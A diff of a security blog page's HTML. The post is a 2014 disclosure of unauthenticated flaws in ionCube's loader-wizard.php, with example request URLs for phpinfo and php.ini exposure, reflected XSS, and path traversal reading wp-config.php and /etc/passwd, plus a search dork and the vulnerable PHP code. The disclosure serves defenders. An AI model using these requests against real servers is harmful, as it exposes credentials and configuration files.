@@ -1,127 +1,208 @@
-<!doctype html>
-<html lang="en" prefix="og: http://ogp.me/ns#">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Multiple Vulnerabilities in ionCube Loader-wizard</title>
-  <meta name="description"
-    content="Multiple Vulnerabilities in ionCube Loader-wizard">
   
-  <meta name="author" content="Christian Mehlmauer">
+    <title>Multiple Vulnerabilities in ionCube Loader-wizard :: firefart</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="In a recent security audit I spotted a file on the server which caught my attention: `loader-wizard.php`. After calling the file via a Browser I noticed it&#39;s part of ionCubes encoding and [obfuscation](http://en.wikipedia.org/wiki/Obfuscation) software. The software can be found on [ionCubes Homepage](http://www.ioncube.com/php_encoder.php)." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://firefart.at/post/multiple-vulnerabilities-in-ioncube-loader-wizard/" />
 
-  <meta name="twitter:card" content="summary">
-  
-  <meta name="twitter:site" content="@firefart" />
-  <meta name="twitter:creator" content="@firefart" />
-  
-  <meta name="twitter:title" content="Multiple Vulnerabilities in ionCube Loader-wizard">
-  <meta name="twitter:description"
-    content="Multiple Vulnerabilities in ionCube Loader-wizard">
-  <meta property="og:title" content="Multiple Vulnerabilities in ionCube Loader-wizard">
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="https://firefart.at/post/multiple-vulnerabilities-in-ioncube-loader-wizard/" />
-  <meta property="og:description"
-    content="Multiple Vulnerabilities in ionCube Loader-wizard">
-  
-  <meta property="og:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
-  <meta name="twitter:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
-  
-  <meta property="og:updated_time" content="2014-03-30 12:00:00 &#43;0100 &#43;0100" />
-  <meta property="article:author" content="https://twitter.com/firefart" />
 
-  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
-    type="text/css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
-  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+
 
   
   
-  <script type="application/ld+json">
-    [{
-        "@context": "http://schema.org",
-        "@type": "WebSite",
-        "name": "firefart",
-        "url": "https://firefart.at"
-      },
-      {
-        "@context": "http://schema.org",
-        "@type": "Person",
-        "name": "Christian Mehlmauer",
-        "url": "https://firefart.at",
-        "sameAs": [
-          "https://twitter.com/firefart",
-          "https://github.com/firefart",
-          "https://www.linkedin.com/in/firefart/"
-        ]
-      }
-    ]
-  </script>
+  
+  
+  
+  <link rel="stylesheet" href="/style.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://firefart.at/img/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://firefart.at" />
+  
+    <meta name="twitter:creator" content="firefart" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Multiple Vulnerabilities in ionCube Loader-wizard">
+<meta property="og:description" content="In a recent security audit I spotted a file on the server which caught my attention: `loader-wizard.php`. After calling the file via a Browser I noticed it&#39;s part of ionCubes encoding and [obfuscation](http://en.wikipedia.org/wiki/Obfuscation) software. The software can be found on [ionCubes Homepage](http://www.ioncube.com/php_encoder.php)." />
+<meta property="og:url" content="https://firefart.at/post/multiple-vulnerabilities-in-ioncube-loader-wizard/" />
+<meta property="og:site_name" content="firefart" />
+
+  
+    <meta property="og:image" content="https://firefart.at/img/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2014-03-30 12:00:00 &#43;0100 &#43;0100" />
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src='https://firefart.at/js/firefart.js' defer></script>
+
+<script type="application/ld+json">
+  [{
+      "@context": "http://schema.org",
+      "@type": "WebSite",
+      "name": "firefart",
+      "url": "https://firefart.at"
+    },
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Christian Mehlmauer",
+      "url": "https://firefart.at",
+      "sameAs": [
+        "https://twitter.com/firefart",
+        "https://github.com/firefart",
+        "https://www.linkedin.com/in/firefart/"
+      ]
+    }
+  ]
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N88XDVDDZ7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-N88XDVDDZ7');
+</script>
+
+
 
 </head>
+<body class="blue">
 
-<body>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <h1 class="brand-title"><a href="/">firefart</a></h1>
-        <h2 class="brand-tagline"> that austrian security guy </h2>
+<div class="container center headings--one-size">
 
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://twitter.com/firefart">
-                        <i class="fa fa-twitter"></i> Twitter
-                    </a>
-                </li>
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://github.com/firefart">
-                        <i class="fa fa-github-alt"></i> Github
-                    </a>
-                </li>
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
-                </li>
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    firefart | that austrian security guy
+  </div>
+</a>
+
     </div>
-</div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu hidden-on-mobile">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/firefart">Github</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/firefart">Twitter</a></li>
+        
+      
+    
+  </ul>
+  <span class="spacer"></span>
+  <ul class="menu__inner menu__inner--desktop">
+    
+  </ul>
 
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
-            
-            <div class="posts">
-                <h1 class="content-subhead">30 Mar 2014, 12:00</h1>
-                <section class="post">
-                    <header class="post-header">
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/firefart">Github</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/firefart">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
 
-                        <a href="/post/multiple-vulnerabilities-in-ioncube-loader-wizard/" class="post-title">Multiple Vulnerabilities in ionCube Loader-wizard</a>
+  
+</header>
 
-                        <p class="post-meta">
-                            
-                            
-                        </p>
-                    </header>
 
-                    
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://firefart.at/post/multiple-vulnerabilities-in-ioncube-loader-wizard/">Multiple Vulnerabilities in ionCube Loader-wizard</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2014-03-30 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Christian Mehlmauer</span>
+    
+    
+  </div>
 
-                    <div class="post-description">
-                        <p>In a recent security audit I spotted a file on the server which caught my attention: <code>loader-wizard.php</code>.</p>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>In a recent security audit I spotted a file on the server which caught my attention: <code>loader-wizard.php</code>.</p>
 <p>After calling the file via a Browser I noticed it&rsquo;s part of ionCubes encoding and <a href="http://en.wikipedia.org/wiki/Obfuscation">obfuscation</a> software. The software can be found on <a href="http://www.ioncube.com/php_encoder.php">ionCubes Homepage</a>.</p>
 <p>The software compiles your php code into custom bytecode and performs some obfuscation on variable names, class names and so on. This way you can ship your php based product without revealing the original sourcecode. To teach the server how to interpret the encoded format you need to install a seperate ionCube php extension on your server which decrypts the php files at runtime. In my opinion the extra extension is a little bit too much because there can be some vulnerabilities in there too but it looks like many people are using it. The found file <code>loader-wizard.php</code> is a little helper script used to detect if the extension is loaded and guide you through the installation process.</p>
 <p>The file itself contains many vulnerabilities which are all exploitable with no authentication.</p>
@@ -129,26 +210,26 @@
 <p>Doing a quick search on Google using the dork <a href="https://www.google.com/search?q=inurl%3Aloader-wizard.php">inurl:loader-wizard.php</a> reveals about 34,400 found files. Assuming no one links an installer script they are all found because directory indexing is active so there are probably much more scripts out there. I checked some of the search results with the &ldquo;phpinfo vulnerability&rdquo; described below, and all were vulnerable.</p>
 <p>I tested the latest version of the loader available for download at the time of writing (2.42) and version 2.36 which is the one I found on the server. All reported vulnerabilities are present in both versions. You can determine the installed version by looking at the footer of the page.</p>
 <p>The fixed version is 2.46. Some vulnerabilities like the phpinfo are not fixed because they represent the functionality of the script. Ioncube added a notice on top of every page to remove the file after successful installation.</p>
-<h1 id="phpinfo-exposure">phpinfo exposure</h1>
+<h2 id="phpinfo-exposure">phpinfo exposure<a href="#phpinfo-exposure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When calling the page <code>phpinfo</code> the scripts executes <code>phpinfo()</code> and presents the contents.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpinfo
-</code></pre><p><img src="/img/ioncube/phpinfo.png" alt="phpinfo" title="phpinfo"></p>
-<h1 id="phpini-exposure">php.ini exposure</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=phpinfo
+</span></span></code></pre></div><p><img src="/img/ioncube/phpinfo.png" alt="phpinfo" title="phpinfo"></p>
+<h2 id="phpini-exposure">php.ini exposure<a href="#phpini-exposure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When calling the page <code>phpconfig</code> the scripts reads your <code>php.ini</code> settings file and prints out all the contents.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig
-</code></pre><p><img src="/img/ioncube/phpconfig.png" alt="phpconfig" title="phpconfig"></p>
-<h1 id="extra-information">extra information</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=phpconfig
+</span></span></code></pre></div><p><img src="/img/ioncube/phpconfig.png" alt="phpconfig" title="phpconfig"></p>
+<h2 id="extra-information">extra information<a href="#extra-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When calling the page <code>extra</code> the scripts outputs some additional informations about the server.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=extra
-</code></pre><p><img src="/img/ioncube/extra.png" alt="extra" title="extra"></p>
-<h1 id="download-configs-as-zipped-file">Download configs as zipped file</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=extra
+</span></span></code></pre></div><p><img src="/img/ioncube/extra.png" alt="extra" title="extra"></p>
+<h2 id="download-configs-as-zipped-file">Download configs as zipped file<a href="#download-configs-as-zipped-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When calling the page <code>system_info_archive</code> it&rsquo;s possible to download a zip file containing a copy of the <code>php.ini</code>, <code>phpinfo()</code> output and the extra informations printed on the <code>extra</code> page.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=system_info_archive
-</code></pre><p><img src="/img/ioncube/system_info_archive.png" alt="archive" title="archive"></p>
-<h1 id="reflected-xss">reflected XSS</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=system_info_archive
+</span></span></code></pre></div><p><img src="/img/ioncube/system_info_archive.png" alt="archive" title="archive"></p>
+<h2 id="reflected-xss">reflected XSS<a href="#reflected-xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>The script uses the PHP variable <code>$self</code> in various places. It&rsquo;s possible to inject script code in the script name and thus the script is vulnerable to reflected cross site scripting.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php/%3Cxss%3E
-</code></pre><p>The string <code>&lt;xss&gt;</code> is printed out unescaped 10 times.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php/%3Cxss%3E
+</span></span></code></pre></div><p>The string <code>&lt;xss&gt;</code> is printed out unescaped 10 times.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/loader-wizard.php/&lt;xss&gt;?page=css&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>setTimeout(&#34;window.location.href = &#39;/loader-wizard.php/&lt;<span style="color:#f92672">xss</span>&gt;?page=default&amp;amp;timeout=1&#39;&#34;,1000);
 </span></span><span style="display:flex;"><span>window.location.href = &#39;/loader-wizard.php/&lt;<span style="color:#f92672">xss</span>&gt;?page=default&#39;;
@@ -160,12 +241,12 @@
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/loader-wizard.php/&lt;xss&gt;?page=default&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/loader-wizard.php/&lt;xss&gt;?page=default&amp;amp;timeout=1&#34;</span>&gt;
 </span></span></code></pre></div><p><img src="/img/ioncube/xss.png" alt="xss" title="xss"></p>
-<h1 id="get-arbitrary-file-on-server">Get arbitrary file on server</h1>
+<h2 id="get-arbitrary-file-on-server">Get arbitrary file on server<a href="#get-arbitrary-file-on-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>The page <code>phpconfig</code> can be abused to download arbitrary files the webserver has access to.</p>
-<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../var/www/wordpress/wp-config.php&amp;download=1
-</code></pre><pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../etc/passwd&amp;download=1
-</code></pre><p><img src="/img/ioncube/file.png" alt="file" title="file"></p>
-<h2 id="vulnerable-code">Vulnerable code</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../var/www/wordpress/wp-config.php&amp;download=1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../etc/passwd&amp;download=1
+</span></span></code></pre></div><p><img src="/img/ioncube/file.png" alt="file" title="file"></p>
+<h3 id="vulnerable-code">Vulnerable code<a href="#vulnerable-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>You can see you need to set the <code>download</code> parameter to supply an own <code>ininame</code>. On line 30 the filepath is constructed without sanitizing the filename.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">phpconfig_page</span>()
 </span></span><span style="display:flex;"><span>{
@@ -206,53 +287,76 @@
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h1 id="timeline">Timeline</h1>
+</span></span></code></pre></div><h2 id="timeline">Timeline<a href="#timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>02.03.2014 - Contacted Vendor</p>
 <p>02.03.2014 - Response from vendor, will be fixed asap</p>
 <p>04.03.2014 - Fixed version released (2.46)</p>
 <p>30.03.2014 - Blog post published</p>
-                    </div>
-                </section>
-            </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
-        <ul>
-            <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/firefart/firefart.github.io">Github</a></li>
-        </ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://firefart.at/post/how-to-install-wordpress/">
+                <span class="button__icon">←</span>
+                <span class="button__text">How to Install Wordpress</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://firefart.at/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/">
+                <span class="button__text">SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
     </div>
 </div>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
-<script type="text/javascript">
-    var _paq = window._paq || [];
-     
-    _paq.push(["setCookieDomain", "*.firefart.at"]);
-    _paq.push(['trackPageView']);
-    _paq.push(['enableLinkTracking']);
-    (function () {
-        var u = "https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u + 'mat.php']);
-        _paq.push(['setSiteId', '1']);
-        var d = document,
-            g = d.createElement('script'),
-            s = d.getElementsByTagName('script')[0];
-        g.type = 'text/javascript';
-        g.async = true;
-        g.defer = true;
-        g.src = u + 'mat.js';
-        s.parentNode.insertBefore(g, s);
-    })();
-</script>
-<noscript>
-    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
-</noscript>
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Copyright by Christian Mehlmauer</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
 
 
-        </div>
-    </div>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+  
 </div>
+
 </body>
-
 </html>
